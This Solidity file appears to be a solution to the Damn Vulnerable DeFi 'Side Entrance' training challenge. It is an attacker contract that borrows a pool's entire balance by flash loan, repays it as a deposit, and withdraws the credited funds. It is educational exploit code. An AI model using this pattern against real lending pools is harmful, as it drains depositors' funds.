// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderReceiver {
    address private immutable owner;

    ISideEntranceLenderPool immutable pool;

    receive() external payable {}

    constructor(address _pool) {
        owner = msg.sender;
        pool = ISideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        require(address(pool) == msg.sender);
        pool.deposit{value: msg.value}();
    }

    function work() external {
        require(owner == msg.sender);
        uint256 bal = payable(address(pool)).balance;

        pool.flashLoan(bal);
    }

    function withdraw() external {
        require(owner == msg.sender);

        pool.withdraw();

        uint256 bal = payable(address(this)).balance;

        (bool result, ) = payable(owner).call{value: bal}("");

        require(result, "Bad Withdrawal");
    }
}
